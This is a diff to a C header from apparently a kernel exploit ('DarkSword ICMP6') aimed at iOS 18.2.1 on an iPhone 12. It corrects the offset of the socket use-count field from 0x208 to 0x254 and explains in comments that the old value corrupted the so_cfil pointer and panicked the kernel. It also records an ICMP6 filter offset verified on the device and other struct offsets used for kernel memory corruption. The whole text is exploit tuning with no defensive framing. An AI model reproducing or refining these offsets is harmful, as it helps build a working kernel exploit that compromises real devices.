@@ -16,14 +16,19 @@
 #define PAGE_SIZE 0x4000ULL
 
 // ===== DarkSword ICMP6 exploit offsets =====
-// VERIFIED for iOS 18.2.1 / xnu-11215 (darksword-kexploit-main, "OFFICIAL
-// CORRECTED OFFSETS ... XNU-11215.61.5 source struct compilation"):
-//   OFFSET_SOCKET_SO_COUNT = 0x208 (so_retaincnt; was 0x228 pre-XNU-11215,
-//      moved to 0x254 in iOS 18.4 / xnu-11417 per Kev1nLevin disasm)
+// VERIFIED against lara-main (the reference this port is based on), which is
+// PROVEN on this device, plus kernel disassembly of this exact kernelcache
+// (UUID 64C65286-49A8-043A-359C-63FFD6ECA1D8, xnu-11215 / iOS 18.2.1):
+//   OFFSET_SOCKET_SO_COUNT = 0x254 (so_usecount, lara off_socket_so_usecount
+//      for iOS 18.x). NOTE: socket+0x208 is so_cfil, a POINTER field (the
+//      kernel derefs it, e.g. 155 `ldr x8,[xN,#0x208]` sites incl. the ICMP6
+//      filter path); the OLD 0x208 value (from darksword-kexploit-main, whose
+//      icmp6filt=0x138 is also wrong) wrote a counter into so_cfil and caused
+//      the recurring "so+0x208" corruption -> Kernel data abort panics.
 //   OFFSET_SO_PROTO = 0x20 (was 0x18, moved +0x08 in XNU-11215)
 // Cross-check (iOS 18.4 / xnu-11417): ICMP6FILT 0x138, SO_COUNT 0x254,
 // SO_PROTO 0x20, PR_INPUT 0x20 -- so ICMP6FILT/SO_PROTO are stable across
-// the 18.x line; only SO_COUNT differs (0x208 here vs 0x254 on 18.4+).
+// the 18.x line; so_usecount is 0x254 for ALL iOS 18.x per lara offsets.m.
 //
 // NOTE: OFFSET_ICMP6FILT is VERIFIED at runtime, on-device, as 0x148 on this
 // kernel (xnu-11215 / iOS 18.2.1 / iPhone 12 A14):
@@ -36,7 +41,7 @@
 // and stores it in gIcmp6FiltOffset. Do NOT wide-scan 0x88..0x208: planting
 // heap pointers into arbitrary live inpcb fields panics the kernel.
 #define OFFSET_PCB_SOCKET      0x40   // inpcb -> socket (unchanged 15.x-18.4)
-#define OFFSET_SOCKET_SO_COUNT 0x208  // socket so_retaincnt (iOS 18.0-18.3.x)
+#define OFFSET_SOCKET_SO_COUNT 0x254  // socket so_usecount (lara, iOS 18.x) -- 0x208 was so_cfil!
 #define OFFSET_ICMP6FILT       0x148  // inpcb icmp6_filter pointer (18.x) -- VERIFIED on-device
 #define OFFSET_SO_PROTO        0x20   // socket -> protosw (18.x)
 #define OFFSET_PR_INPUT        0x28   // protosw -> pr_input (18.2.x)
